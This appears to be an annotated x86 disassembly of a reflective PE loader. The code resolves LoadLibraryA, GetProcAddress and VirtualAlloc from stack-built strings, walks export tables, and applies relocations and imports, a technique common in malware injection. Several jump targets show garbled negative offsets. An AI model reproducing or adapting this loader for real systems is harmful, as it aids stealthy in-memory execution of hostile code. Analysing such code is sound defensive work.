00000000 55                              PUSH EBP
00000001 8BEC                            MOV EBP,ESP
00000003 83EC78                          SUB ESP,00000078
00000006 8365EC00                        AND DWORD PTR [EBP-14],00000000
0000000A 8365E800                        AND DWORD PTR [EBP-18],00000000
0000000E E8B60E0000                      CALL -FFFFF137
00000013 8945D8                          MOV DWORD PTR [EBP-28],EAX
00000016 8B45D8                          MOV EAX,DWORD PTR [EBP-28]
00000019 8945FC                          MOV DWORD PTR [EBP-04],EAX
0000001C 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
0000001F 8945D4                          MOV DWORD PTR [EBP-2C],EAX
00000022 8B45D4                          MOV EAX,DWORD PTR [EBP-2C]
00000025 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
00000028 03483C                          ADD ECX,DWORD PTR [EAX+3C]
0000002B 894DD0                          MOV DWORD PTR [EBP-30],ECX
0000002E 6A08                            PUSH 00000008
00000030 58                              POP EAX
00000031 6BC000                          IMUL EAX,EAX,00000000
00000034 8B4DD0                          MOV ECX,DWORD PTR [EBP-30]
00000037 8B55FC                          MOV EDX,DWORD PTR [EBP-04]
0000003A 03540178                        ADD EDX,DWORD PTR [ECX+EAX+78]
0000003E 8955F4                          MOV DWORD PTR [EBP-0C],EDX
00000041 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
00000044 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
00000047 03481C                          ADD ECX,DWORD PTR [EAX+1C]
0000004A 894DDC                          MOV DWORD PTR [EBP-24],ECX
0000004D 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
00000050 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
00000053 034824                          ADD ECX,DWORD PTR [EAX+24]
00000056 894DE0                          MOV DWORD PTR [EBP-20],ECX
00000059 C645BC4C                        MOV BYTE PTR [EBP-44],4C     -> LoadLibraryA, GetProcAddress
0000005D C645BD6F                        MOV BYTE PTR [EBP-43],6F
00000061 C645BE61                        MOV BYTE PTR [EBP-42],61
00000065 C645BF64                        MOV BYTE PTR [EBP-41],64
00000069 C645C04C                        MOV BYTE PTR [EBP-40],4C
0000006D C645C169                        MOV BYTE PTR [EBP-3F],69
00000071 C645C262                        MOV BYTE PTR [EBP-3E],62
00000075 C645C372                        MOV BYTE PTR [EBP-3D],72
00000079 C645C461                        MOV BYTE PTR [EBP-3C],61
0000007D C645C572                        MOV BYTE PTR [EBP-3B],72
00000081 C645C679                        MOV BYTE PTR [EBP-3A],79
00000085 C645C741                        MOV BYTE PTR [EBP-39],41
00000089 C645C800                        MOV BYTE PTR [EBP-38],00   <- Null byte
0000008D C645AC47                        MOV BYTE PTR [EBP-54],47
00000091 C645AD65                        MOV BYTE PTR [EBP-53],65
00000095 C645AE74                        MOV BYTE PTR [EBP-52],74
00000099 C645AF50                        MOV BYTE PTR [EBP-51],50
0000009D C645B072                        MOV BYTE PTR [EBP-50],72
000000A1 C645B16F                        MOV BYTE PTR [EBP-4F],6F
000000A5 C645B263                        MOV BYTE PTR [EBP-4E],63
000000A9 C645B341                        MOV BYTE PTR [EBP-4D],41
000000AD C645B464                        MOV BYTE PTR [EBP-4C],64
000000B1 C645B564                        MOV BYTE PTR [EBP-4B],64
000000B5 C645B672                        MOV BYTE PTR [EBP-4A],72
000000B9 C645B765                        MOV BYTE PTR [EBP-49],65
000000BD C645B873                        MOV BYTE PTR [EBP-48],73
000000C1 C645B973                        MOV BYTE PTR [EBP-47],73
000000C5 C645BA00                        MOV BYTE PTR [EBP-46],00  <- Null byte
000000C9 C745CC06000000                  MOV DWORD PTR [EBP-34],00000006
000000D0 8365F800                        AND DWORD PTR [EBP-08],00000000
000000D4 EB07                            JMP 000000DD
000000D6 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
000000D9 40                              INC EAX
000000DA 8945F8                          MOV DWORD PTR [EBP-08],EAX
000000DD 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
000000E0 8B4DF8                          MOV ECX,DWORD PTR [EBP-08]
000000E3 3B4818                          CMP ECX,DWORD PTR [EAX+18]
000000E6 0F8302010000                    JAE -FFFFFE12
000000EC 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
000000EF 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
000000F2 034820                          ADD ECX,DWORD PTR [EAX+20]
000000F5 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
000000F8 8B55FC                          MOV EDX,DWORD PTR [EBP-04]
000000FB 031481                          ADD EDX,DWORD PTR [ECX+EAX*4]
000000FE 8955E4                          MOV DWORD PTR [EBP-1C],EDX
00000101 8D45AC                          LEA EAX,[EBP-54]
00000104 50                              PUSH EAX
00000105 FF75E4                          PUSH DWORD PTR [EBP-1C]
00000108 E8EB0C0000                      CALL -FFFFF208
0000010D 59                              POP ECX
0000010E 59                              POP ECX
0000010F 85C0                            TEST EAX,EAX
00000111 7518                            JNE 0000012B
00000113 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
00000116 8B4DE0                          MOV ECX,DWORD PTR [EBP-20]
00000119 0FB70441                        MOVZX EAX,WORD PTR [ECX+EAX*2]
0000011D 8B4DDC                          MOV ECX,DWORD PTR [EBP-24]
00000120 8B55FC                          MOV EDX,DWORD PTR [EBP-04]
00000123 031481                          ADD EDX,DWORD PTR [ECX+EAX*4]
00000126 8955E8                          MOV DWORD PTR [EBP-18],EDX
00000129 EB28                            JMP 00000153
0000012B 8D45BC                          LEA EAX,[EBP-44]
0000012E 50                              PUSH EAX
0000012F FF75E4                          PUSH DWORD PTR [EBP-1C]
00000132 E8C10C0000                      CALL -FFFFF208
00000137 59                              POP ECX
00000138 59                              POP ECX
00000139 85C0                            TEST EAX,EAX
0000013B 7516                            JNE 00000153
0000013D 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
00000140 8B4DE0                          MOV ECX,DWORD PTR [EBP-20]
00000143 0FB70441                        MOVZX EAX,WORD PTR [ECX+EAX*2]
00000147 8B4DDC                          MOV ECX,DWORD PTR [EBP-24]
0000014A 8B55FC                          MOV EDX,DWORD PTR [EBP-04]
0000014D 031481                          ADD EDX,DWORD PTR [ECX+EAX*4]
00000150 8955EC                          MOV DWORD PTR [EBP-14],EDX
00000153 837DE800                        CMP DWORD PTR [EBP-18],00000000
00000157 0F848C000000                    JE -FFFFFE17
0000015D 837DEC00                        CMP DWORD PTR [EBP-14],00000000
00000161 0F8482000000                    JE -FFFFFE17
00000167 8D4588                          LEA EAX,[EBP-78]
0000016A 8945F0                          MOV DWORD PTR [EBP-10],EAX
0000016D 6A24                            PUSH 00000024
0000016F 6A00                            PUSH 00000000
00000171 FF75F0                          PUSH DWORD PTR [EBP-10]
00000174 E81C0B0000                      CALL -FFFFF36B
00000179 83C40C                          ADD ESP,0000000C
0000017C 33C0                            XOR EAX,EAX
0000017E 40                              INC EAX
0000017F 6BC000                          IMUL EAX,EAX,00000000
00000182 8B4D0C                          MOV ECX,DWORD PTR [EBP+0C]
00000185 0FB60401                        MOVZX EAX,BYTE PTR [ECX+EAX]
00000189 C1E018                          SHL EAX,18
0000018C 33C9                            XOR ECX,ECX
0000018E 41                              INC ECX
0000018F C1E100                          SHL ECX,00
00000192 8B550C                          MOV EDX,DWORD PTR [EBP+0C]
00000195 0FB60C0A                        MOVZX ECX,BYTE PTR [EDX+ECX]
00000199 C1E110                          SHL ECX,10
0000019C 0BC1                            OR EAX,ECX
0000019E 33C9                            XOR ECX,ECX
000001A0 41                              INC ECX
000001A1 D1E1                            SHL ECX,1
000001A3 8B550C                          MOV EDX,DWORD PTR [EBP+0C]
000001A6 0FB60C0A                        MOVZX ECX,BYTE PTR [EDX+ECX]
000001AA C1E108                          SHL ECX,08
000001AD 0BC1                            OR EAX,ECX
000001AF 33C9                            XOR ECX,ECX
000001B1 41                              INC ECX
000001B2 6BC903                          IMUL ECX,ECX,00000003
000001B5 8B550C                          MOV EDX,DWORD PTR [EBP+0C]
000001B8 0FB60C0A                        MOVZX ECX,BYTE PTR [EDX+ECX]
000001BC 0BC1                            OR EAX,ECX
000001BE 8B4DF0                          MOV ECX,DWORD PTR [EBP-10]
000001C1 894114                          MOV DWORD PTR [ECX+14],EAX
000001C4 8B450C                          MOV EAX,DWORD PTR [EBP+0C]
000001C7 83C004                          ADD EAX,00000004
000001CA 8B4DF0                          MOV ECX,DWORD PTR [EBP-10]
000001CD 894110                          MOV DWORD PTR [ECX+10],EAX
000001D0 8B45F0                          MOV EAX,DWORD PTR [EBP-10]
000001D3 C6400C01                        MOV BYTE PTR [EAX+0C],01
000001D7 8D4588                          LEA EAX,[EBP-78]
000001DA 50                              PUSH EAX
000001DB FF75EC                          PUSH DWORD PTR [EBP-14]
000001DE FF75E8                          PUSH DWORD PTR [EBP-18]
000001E1 E8560A0000                      CALL -FFFFF3C4
000001E6 83C40C                          ADD ESP,0000000C
000001E9 E9E8FEFFFF                      JMP 000000D6
000001EE 33C0                            XOR EAX,EAX
000001F0 C9                              LEAVE
000001F1 C20800                          RET 0008
000001F4 55                              PUSH EBP
000001F5 8BEC                            MOV EBP,ESP
000001F7 83EC20                          SUB ESP,00000020
000001FA 8B4508                          MOV EAX,DWORD PTR [EBP+08]
000001FD 8945E8                          MOV DWORD PTR [EBP-18],EAX
00000200 8B45E8                          MOV EAX,DWORD PTR [EBP-18]
00000203 8B4D08                          MOV ECX,DWORD PTR [EBP+08]
00000206 03483C                          ADD ECX,DWORD PTR [EAX+3C]
00000209 894DE4                          MOV DWORD PTR [EBP-1C],ECX
0000020C 6A08                            PUSH 00000008
0000020E 58                              POP EAX
0000020F 6BC005                          IMUL EAX,EAX,00000005
00000212 8B4DE4                          MOV ECX,DWORD PTR [EBP-1C]
00000215 8B5508                          MOV EDX,DWORD PTR [EBP+08]
00000218 03540178                        ADD EDX,DWORD PTR [ECX+EAX+78]
0000021C 8955F4                          MOV DWORD PTR [EBP-0C],EDX
0000021F 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
00000222 83780400                        CMP DWORD PTR [EAX+04],00000000
00000226 0F845E010000                    JE -FFFFFC76
0000022C 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
0000022F 8B4D08                          MOV ECX,DWORD PTR [EBP+08]
00000232 0308                            ADD ECX,DWORD PTR [EAX]
00000234 894DF8                          MOV DWORD PTR [EBP-08],ECX
00000237 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
0000023A 8B4004                          MOV EAX,DWORD PTR [EAX+04]
0000023D 83E808                          SUB EAX,00000008
00000240 D1E8                            SHR EAX,1
00000242 8945EC                          MOV DWORD PTR [EBP-14],EAX
00000245 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
00000248 83C008                          ADD EAX,00000008
0000024B 8945FC                          MOV DWORD PTR [EBP-04],EAX
0000024E 8B45EC                          MOV EAX,DWORD PTR [EBP-14]
00000251 8945E0                          MOV DWORD PTR [EBP-20],EAX
00000254 8B45EC                          MOV EAX,DWORD PTR [EBP-14]
00000257 48                              DEC EAX
00000258 8945EC                          MOV DWORD PTR [EBP-14],EAX
0000025B 837DE000                        CMP DWORD PTR [EBP-20],00000000
0000025F 0F8414010000                    JE -FFFFFC87
00000265 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000268 668B00                          MOV AX,WORD PTR [EAX]
0000026B 66C1E80C                        SHR AX,0C
0000026F 6683E00F                        AND AX,000F
00000273 0FB7C0                          MOVZX EAX,EAX
00000276 8945F0                          MOV DWORD PTR [EBP-10],EAX
00000279 837DF001                        CMP DWORD PTR [EBP-10],00000001
0000027D 7478                            JE 000002F7
0000027F 837DF002                        CMP DWORD PTR [EBP-10],00000002
00000283 0F84AB000000                    JE -FFFFFCCC
00000289 837DF003                        CMP DWORD PTR [EBP-10],00000003
0000028D 743B                            JE 000002CA
0000028F 837DF00A                        CMP DWORD PTR [EBP-10],0000000A
00000293 7405                            JE 0000029A
00000295 E9D2000000                      JMP -FFFFFC94
0000029A B8FF0F0000                      MOV EAX,00000FFF
0000029F 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
000002A2 662301                          AND AX,WORD PTR [ECX]
000002A5 0FB7C0                          MOVZX EAX,EAX
000002A8 8B4DF8                          MOV ECX,DWORD PTR [EBP-08]
000002AB 8B0401                          MOV EAX,DWORD PTR [ECX+EAX]
000002AE 03450C                          ADD EAX,DWORD PTR [EBP+0C]
000002B1 B9FF0F0000                      MOV ECX,00000FFF
000002B6 8B55FC                          MOV EDX,DWORD PTR [EBP-04]
000002B9 66230A                          AND CX,WORD PTR [EDX]
000002BC 0FB7C9                          MOVZX ECX,ECX
000002BF 8B55F8                          MOV EDX,DWORD PTR [EBP-08]
000002C2 89040A                          MOV DWORD PTR [EDX+ECX],EAX
000002C5 E9A2000000                      JMP -FFFFFC94
000002CA B8FF0F0000                      MOV EAX,00000FFF
000002CF 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
000002D2 662301                          AND AX,WORD PTR [ECX]
000002D5 0FB7C0                          MOVZX EAX,EAX
000002D8 8B4DF8                          MOV ECX,DWORD PTR [EBP-08]
000002DB 8B0401                          MOV EAX,DWORD PTR [ECX+EAX]
000002DE 03450C                          ADD EAX,DWORD PTR [EBP+0C]
000002E1 B9FF0F0000                      MOV ECX,00000FFF
000002E6 8B55FC                          MOV EDX,DWORD PTR [EBP-04]
000002E9 66230A                          AND CX,WORD PTR [EDX]
000002EC 0FB7C9                          MOVZX ECX,ECX
000002EF 8B55F8                          MOV EDX,DWORD PTR [EBP-08]
000002F2 89040A                          MOV DWORD PTR [EDX+ECX],EAX
000002F5 EB75                            JMP 0000036C
000002F7 B8FF0F0000                      MOV EAX,00000FFF
000002FC 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
000002FF 662301                          AND AX,WORD PTR [ECX]
00000302 0FB7C0                          MOVZX EAX,EAX
00000305 8B4D0C                          MOV ECX,DWORD PTR [EBP+0C]
00000308 C1E910                          SHR ECX,10
0000030B 81E1FFFF0000                    AND ECX,0000FFFF
00000311 0FB7C9                          MOVZX ECX,ECX
00000314 8B55F8                          MOV EDX,DWORD PTR [EBP-08]
00000317 0FB70402                        MOVZX EAX,WORD PTR [EDX+EAX]
0000031B 03C1                            ADD EAX,ECX
0000031D B9FF0F0000                      MOV ECX,00000FFF
00000322 8B55FC                          MOV EDX,DWORD PTR [EBP-04]
00000325 66230A                          AND CX,WORD PTR [EDX]
00000328 0FB7C9                          MOVZX ECX,ECX
0000032B 8B55F8                          MOV EDX,DWORD PTR [EBP-08]
0000032E 6689040A                        MOV WORD PTR [EDX+ECX],AX
00000332 EB38                            JMP 0000036C
00000334 B8FF0F0000                      MOV EAX,00000FFF
00000339 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
0000033C 662301                          AND AX,WORD PTR [ECX]
0000033F 0FB7C0                          MOVZX EAX,EAX
00000342 8B4D0C                          MOV ECX,DWORD PTR [EBP+0C]
00000345 81E1FFFF0000                    AND ECX,0000FFFF
0000034B 0FB7C9                          MOVZX ECX,ECX
0000034E 8B55F8                          MOV EDX,DWORD PTR [EBP-08]
00000351 0FB70402                        MOVZX EAX,WORD PTR [EDX+EAX]
00000355 03C1                            ADD EAX,ECX
00000357 B9FF0F0000                      MOV ECX,00000FFF
0000035C 8B55FC                          MOV EDX,DWORD PTR [EBP-04]
0000035F 66230A                          AND CX,WORD PTR [EDX]
00000362 0FB7C9                          MOVZX ECX,ECX
00000365 8B55F8                          MOV EDX,DWORD PTR [EBP-08]
00000368 6689040A                        MOV WORD PTR [EDX+ECX],AX
0000036C 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
0000036F 40                              INC EAX
00000370 40                              INC EAX
00000371 8945FC                          MOV DWORD PTR [EBP-04],EAX
00000374 E9D5FEFFFF                      JMP 0000024E
00000379 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
0000037C 8B4DF4                          MOV ECX,DWORD PTR [EBP-0C]
0000037F 034804                          ADD ECX,DWORD PTR [EAX+04]
00000382 894DF4                          MOV DWORD PTR [EBP-0C],ECX
00000385 E995FEFFFF                      JMP 0000021F
0000038A 33C0                            XOR EAX,EAX
0000038C 40                              INC EAX
0000038D C9                              LEAVE
0000038E C3                              RET
0000038F 55                              PUSH EBP
00000390 8BEC                            MOV EBP,ESP
00000392 83EC38                          SUB ESP,00000038
00000395 8365E000                        AND DWORD PTR [EBP-20],00000000
00000399 8365EC00                        AND DWORD PTR [EBP-14],00000000
0000039D 8B4510                          MOV EAX,DWORD PTR [EBP+10]
000003A0 8945DC                          MOV DWORD PTR [EBP-24],EAX
000003A3 8B45DC                          MOV EAX,DWORD PTR [EBP-24]
000003A6 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
000003A9 03483C                          ADD ECX,DWORD PTR [EAX+3C]
000003AC 894DD8                          MOV DWORD PTR [EBP-28],ECX
000003AF 6A08                            PUSH 00000008
000003B1 58                              POP EAX
000003B2 C1E000                          SHL EAX,00
000003B5 8B4DD8                          MOV ECX,DWORD PTR [EBP-28]
000003B8 8B5510                          MOV EDX,DWORD PTR [EBP+10]
000003BB 03540178                        ADD EDX,DWORD PTR [ECX+EAX+78]
000003BF 8955FC                          MOV DWORD PTR [EBP-04],EDX
000003C2 7505                            JNE 000003C9
000003C4 E93D010000                      JMP -FFFFFAFA
000003C9 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
000003CC 83780C00                        CMP DWORD PTR [EAX+0C],00000000
000003D0 0F841B010000                    JE -FFFFFB0F
000003D6 837DEC00                        CMP DWORD PTR [EBP-14],00000000
000003DA 0F8511010000                    JNE -FFFFFB0F
000003E0 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
000003E3 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
000003E6 03480C                          ADD ECX,DWORD PTR [EAX+0C]
000003E9 894DD4                          MOV DWORD PTR [EBP-2C],ECX
000003EC FF75D4                          PUSH DWORD PTR [EBP-2C]
000003EF FF550C                          CALL DWORD PTR [EBP+0C]
000003F2 8945F8                          MOV DWORD PTR [EBP-08],EAX
000003F5 837DF800                        CMP DWORD PTR [EBP-08],00000000
000003F9 750C                            JNE 00000407
000003FB C745EC01000000                  MOV DWORD PTR [EBP-14],00000001
00000402 E9EA000000                      JMP -FFFFFB0F
00000407 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
0000040A 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
0000040D 034810                          ADD ECX,DWORD PTR [EAX+10]
00000410 894DF0                          MOV DWORD PTR [EBP-10],ECX
00000413 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000416 833800                          CMP DWORD PTR [EAX],00000000
00000419 7508                            JNE 00000423
0000041B 8B45F0                          MOV EAX,DWORD PTR [EBP-10]
0000041E 8945F4                          MOV DWORD PTR [EBP-0C],EAX
00000421 EB0B                            JMP 0000042E
00000423 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
00000426 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
00000429 0308                            ADD ECX,DWORD PTR [EAX]
0000042B 894DF4                          MOV DWORD PTR [EBP-0C],ECX
0000042E 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
00000431 833800                          CMP DWORD PTR [EAX],00000000
00000434 0F84A9000000                    JE -FFFFFB1D
0000043A 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
0000043D 8B00                            MOV EAX,DWORD PTR [EAX]
0000043F 2500000080                      AND EAX,80000000
00000444 7459                            JE 0000049F
00000446 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
00000449 8945D0                          MOV DWORD PTR [EBP-30],EAX
0000044C 8B45D0                          MOV EAX,DWORD PTR [EBP-30]
0000044F 8B4DF8                          MOV ECX,DWORD PTR [EBP-08]
00000452 03483C                          ADD ECX,DWORD PTR [EAX+3C]
00000455 894DCC                          MOV DWORD PTR [EBP-34],ECX
00000458 6A08                            PUSH 00000008
0000045A 58                              POP EAX
0000045B 6BC000                          IMUL EAX,EAX,00000000
0000045E 8B4DCC                          MOV ECX,DWORD PTR [EBP-34]
00000461 8B55F8                          MOV EDX,DWORD PTR [EBP-08]
00000464 03540178                        ADD EDX,DWORD PTR [ECX+EAX+78]
00000468 8955E4                          MOV DWORD PTR [EBP-1C],EDX
0000046B 8B45E4                          MOV EAX,DWORD PTR [EBP-1C]
0000046E 8B4DF8                          MOV ECX,DWORD PTR [EBP-08]
00000471 03481C                          ADD ECX,DWORD PTR [EAX+1C]
00000474 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
00000477 8B00                            MOV EAX,DWORD PTR [EAX]
00000479 25FFFF0000                      AND EAX,0000FFFF
0000047E 8B55E4                          MOV EDX,DWORD PTR [EBP-1C]
00000481 2B4210                          SUB EAX,DWORD PTR [EDX+10]
00000484 8D0481                          LEA EAX,[ECX+EAX*4]
00000487 8945E8                          MOV DWORD PTR [EBP-18],EAX
0000048A 8B45E8                          MOV EAX,DWORD PTR [EBP-18]
0000048D 8B4DF8                          MOV ECX,DWORD PTR [EBP-08]
00000490 0308                            ADD ECX,DWORD PTR [EAX]
00000492 894DE8                          MOV DWORD PTR [EBP-18],ECX
00000495 8B45F0                          MOV EAX,DWORD PTR [EBP-10]
00000498 8B4DE8                          MOV ECX,DWORD PTR [EBP-18]
0000049B 8908                            MOV DWORD PTR [EAX],ECX
0000049D EB2D                            JMP 000004CC
0000049F 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
000004A2 8B4D10                          MOV ECX,DWORD PTR [EBP+10]
000004A5 0308                            ADD ECX,DWORD PTR [EAX]
000004A7 894DC8                          MOV DWORD PTR [EBP-38],ECX
000004AA 8B45C8                          MOV EAX,DWORD PTR [EBP-38]
000004AD 40                              INC EAX
000004AE 40                              INC EAX
000004AF 50                              PUSH EAX
000004B0 FF75F8                          PUSH DWORD PTR [EBP-08]
000004B3 FF5508                          CALL DWORD PTR [EBP+08]
000004B6 8B4DF0                          MOV ECX,DWORD PTR [EBP-10]
000004B9 8901                            MOV DWORD PTR [ECX],EAX
000004BB 8B45F0                          MOV EAX,DWORD PTR [EBP-10]
000004BE 833800                          CMP DWORD PTR [EAX],00000000
000004C1 7509                            JNE 000004CC
000004C3 C745EC01000000                  MOV DWORD PTR [EBP-14],00000001
000004CA EB17                            JMP 000004E3
000004CC 8B45F4                          MOV EAX,DWORD PTR [EBP-0C]
000004CF 83C004                          ADD EAX,00000004
000004D2 8945F4                          MOV DWORD PTR [EBP-0C],EAX
000004D5 8B45F0                          MOV EAX,DWORD PTR [EBP-10]
000004D8 83C004                          ADD EAX,00000004
000004DB 8945F0                          MOV DWORD PTR [EBP-10],EAX
000004DE E94BFFFFFF                      JMP 0000042E
000004E3 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
000004E6 83C014                          ADD EAX,00000014
000004E9 8945FC                          MOV DWORD PTR [EBP-04],EAX
000004EC E9D8FEFFFF                      JMP 000003C9
000004F1 837DEC00                        CMP DWORD PTR [EBP-14],00000000
000004F5 7507                            JNE 000004FE
000004F7 C745E001000000                  MOV DWORD PTR [EBP-20],00000001
000004FE 33C0                            XOR EAX,EAX
00000500 0F85A9FEFFFF                    JNE 000003AF
00000506 8B45E0                          MOV EAX,DWORD PTR [EBP-20]
00000509 C9                              LEAVE
0000050A C3                              RET
0000050B 55                              PUSH EBP
0000050C 8BEC                            MOV EBP,ESP
0000050E 83EC24                          SUB ESP,00000024
00000511 C645DC47                        MOV BYTE PTR [EBP-24],47    -> GetModuleHandleA
00000515 C645DD65                        MOV BYTE PTR [EBP-23],65
00000519 C645DE74                        MOV BYTE PTR [EBP-22],74
0000051D C645DF4D                        MOV BYTE PTR [EBP-21],4D
00000521 C645E06F                        MOV BYTE PTR [EBP-20],6F
00000525 C645E164                        MOV BYTE PTR [EBP-1F],64
00000529 C645E275                        MOV BYTE PTR [EBP-1E],75
0000052D C645E36C                        MOV BYTE PTR [EBP-1D],6C
00000531 C645E465                        MOV BYTE PTR [EBP-1C],65
00000535 C645E548                        MOV BYTE PTR [EBP-1B],48
00000539 C645E661                        MOV BYTE PTR [EBP-1A],61
0000053D C645E76E                        MOV BYTE PTR [EBP-19],6E
00000541 C645E864                        MOV BYTE PTR [EBP-18],64
00000545 C645E96C                        MOV BYTE PTR [EBP-17],6C
00000549 C645EA65                        MOV BYTE PTR [EBP-16],65
0000054D C645EB41                        MOV BYTE PTR [EBP-15],41
00000551 C645EC00                        MOV BYTE PTR [EBP-14],00
00000555 8D45DC                          LEA EAX,[EBP-24]
00000558 50                              PUSH EAX
00000559 E86B090000                      CALL -FFFFF137
0000055E 50                              PUSH EAX
0000055F FF5508                          CALL DWORD PTR [EBP+08]
00000562 8945F4                          MOV DWORD PTR [EBP-0C],EAX
00000565 6A00                            PUSH 00000000
00000567 FF55F4                          CALL DWORD PTR [EBP-0C]
0000056A 59                              POP ECX
0000056B 8945FC                          MOV DWORD PTR [EBP-04],EAX
0000056E 837DFC00                        CMP DWORD PTR [EBP-04],00000000
00000572 7504                            JNE 00000578
00000574 33C0                            XOR EAX,EAX
00000576 EB4A                            JMP 000005C2
00000578 8B45FC                          MOV EAX,DWORD PTR [EBP-04]
0000057B 8945F0                          MOV DWORD PTR [EBP-10],EAX
0000057E 8B45F0                          MOV EAX,DWORD PTR [EBP-10]
00000581 8B4DFC                          MOV ECX,DWORD PTR [EBP-04]
00000584 03483C                          ADD ECX,DWORD PTR [EAX+3C]
00000587 894DF8                          MOV DWORD PTR [EBP-08],ECX
0000058A 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
0000058D 813850450000                    CMP DWORD PTR [EAX],00004550
00000593 7404                            JE 00000599
00000595 33C0                            XOR EAX,EAX
00000597 EB29                            JMP 000005C2
00000599 8B4510                          MOV EAX,DWORD PTR [EBP+10]
0000059C 8B4008                          MOV EAX,DWORD PTR [EAX+08]
0000059F 8B4034                          MOV EAX,DWORD PTR [EAX+34]
000005A2 3B45FC                          CMP EAX,DWORD PTR [EBP-04]
000005A5 7219                            JB 000005C0
000005A7 8B4510                          MOV EAX,DWORD PTR [EBP+10]
000005AA 8B4008                          MOV EAX,DWORD PTR [EAX+08]
000005AD 8B4DF8                          MOV ECX,DWORD PTR [EBP-08]
000005B0 8B55FC                          MOV EDX,DWORD PTR [EBP-04]
000005B3 035150                          ADD EDX,DWORD PTR [ECX+50]
000005B6 395034                          CMP DWORD PTR [EAX+34],EDX
000005B9 7305                            JAE 000005C0
000005BB 33C0                            XOR EAX,EAX
000005BD 40                              INC EAX
000005BE EB02                            JMP 000005C2
000005C0 33C0                            XOR EAX,EAX
000005C2 C9                              LEAVE
000005C3 C3                              RET
000005C4 55                              PUSH EBP
000005C5 8BEC                            MOV EBP,ESP
000005C7 83EC44                          SUB ESP,00000044
000005CA C645BC47                        MOV BYTE PTR [EBP-44],47    -> GetModuleHandleA, VirtualAlloc
000005CE C645BD65                        MOV BYTE PTR [EBP-43],65
000005D2 C645BE74                        MOV BYTE PTR [EBP-42],74
000005D6 C645BF4D                        MOV BYTE PTR [EBP-41],4D
000005DA C645C06F                        MOV BYTE PTR [EBP-40],6F
000005DE C645C164                        MOV BYTE PTR [EBP-3F],64
000005E2 C645C275                        MOV BYTE PTR [EBP-3E],75
000005E6 C645C36C                        MOV BYTE PTR [EBP-3D],6C
000005EA C645C465                        MOV BYTE PTR [EBP-3C],65
000005EE C645C548                        MOV BYTE PTR [EBP-3B],48
000005F2 C645C661                        MOV BYTE PTR [EBP-3A],61
000005F6 C645C76E                        MOV BYTE PTR [EBP-39],6E
000005FA C645C864                        MOV BYTE PTR [EBP-38],64
000005FE C645C96C                        MOV BYTE PTR [EBP-37],6C
00000602 C645CA65                        MOV BYTE PTR [EBP-36],65
00000606 C645CB41                        MOV BYTE PTR [EBP-35],41
0000060A C645CC00                        MOV BYTE PTR [EBP-34],00
0000060E C645D056                        MOV BYTE PTR [EBP-30],56
00000612 C645D169                        MOV BYTE PTR [EBP-2F],69
00000616 C645D272                        MOV BYTE PTR [EBP-2E],72
0000061A C645D374                        MOV BYTE PTR [EBP-2D],74
0000061E C645D475                        MOV BYTE PTR [EBP-2C],75
00000622 C645D561                        MOV BYTE PTR [EBP-2B],61
00000626 C645D66C                        MOV BYTE PTR [EBP-2A],6C
0000062A C645D741                        MOV BYTE PTR [EBP-29],41
0000062E C645D86C                        MOV BYTE PTR [EBP-28],6C
00000632 C645D96C                        MOV BYTE PTR [EBP-27],6C
00000636 C645DA6F                        MOV BYTE PTR [EBP-26],6F
0000063A C645DB63                        MOV BYTE PTR [EBP-25],63
0000063E C645DC00                        MOV BYTE PTR [EBP-24],00
00000642 8D45BC                          LEA EAX,[EBP-44]
00000645 50                              PUSH EAX
00000646 E87E080000                      CALL -FFFFF137
0000064B 50                              PUSH EAX
0000064C FF5508                          CALL DWORD PTR [EBP+08]
0000064F 8945EC                          MOV DWORD PTR [EBP-14],EAX
00000652 8D45D0                          LEA EAX,[EBP-30]
00000655 50                              PUSH EAX
00000656 E86E080000                      CALL -FFFFF137
0000065B 50                              PUSH EAX
0000065C FF5508                          CALL DWORD PTR [EBP+08]
0000065F 8945E4                          MOV DWORD PTR [EBP-1C],EAX
00000662 6A00                            PUSH 00000000
00000664 FF55EC                          CALL DWORD PTR [EBP-14]
00000667 59                              POP ECX
00000668 8945F8                          MOV DWORD PTR [EBP-08],EAX
0000066B 837DF800                        CMP DWORD PTR [EBP-08],00000000
0000066F 7507                            JNE 00000678
00000671 33C0                            XOR EAX,EAX
00000673 E9BC000000                      JMP -FFFFF8CC
00000678 8B45F8                          MOV EAX,DWORD PTR [EBP-08]
0000067B 8945E8                          MOV DWORD PTR [EBP-18],EAX
0000067E 8B45E8                          MOV EAX,DWORD PTR [EBP-18]
00000681 8B4DF8                          MOV ECX,DWORD PTR [EBP-08]
